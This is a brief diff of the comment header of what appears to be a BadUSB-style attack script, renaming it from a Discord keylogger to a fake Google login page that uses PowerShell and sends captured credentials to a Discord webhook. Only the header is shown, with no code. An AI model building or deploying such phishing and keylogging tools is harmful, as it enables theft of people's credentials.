@@ -1,4 +1,4 @@
-REM Title: Keylogger to Discord
+REM Title: Fake Google Login to Discord
 REM Author: @beigeworm
 REM Description: Uses Powershell to open a webview window with a phishing page that sends the results to a discord webhook.
 REM Target: Windows 10
